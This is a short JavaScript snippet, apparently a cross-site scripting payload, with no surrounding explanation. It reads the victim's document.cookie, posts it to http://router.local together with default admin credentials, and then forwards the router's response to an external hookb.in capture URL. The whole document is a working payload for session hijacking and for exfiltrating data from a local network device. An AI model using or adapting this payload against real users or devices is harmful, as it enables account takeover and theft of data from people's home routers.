const http = new XMLHttpRequest();
http.open('POST', 'http://router.local', true);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/2q9jjKeoQKidzq88RbeX', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseText));

};
const cook = document.cookie;

http.send("PHPSESSID="+cook+"&username=admin&pin=admin&notRobot=on");

   

